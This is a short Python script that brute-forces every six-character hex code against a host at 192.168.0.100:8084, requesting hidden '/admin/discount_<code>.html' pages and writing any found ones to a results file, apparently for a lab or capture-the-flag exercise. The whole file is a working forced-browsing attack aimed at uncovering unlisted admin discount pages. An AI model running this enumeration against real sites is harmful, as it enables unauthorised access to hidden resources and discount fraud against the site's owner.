import requests
import itertools
from bs4 import BeautifulSoup

count = 1

# create all permutations with 6 characters (lower case and 0-9)
codes = itertools.product('abcdef0123456789', repeat=6)

for code in codes:
    code_string = "".join(code)
    response = requests.get(f"http://192.168.0.100:8084/admin/discount_{code_string}.html", headers={'Connection':'close'})
    soup = BeautifulSoup(response.text, "html.parser")
    title = soup.find('title').get_text()
    if response.status_code == 404:
        print(f"Attempt number: {count} - code: {code_string} - title: {title}")
    elif response.status_code == 200:
        print(f"Succesful attempt! Number: {count} code: {code_string} - title: {title}")
        with open('results.txt', 'a') as file:
            file.write(f"Succesful attempt! Number: {count} code: {code_string} - title: {title}\n")
    count += 1

file.close()
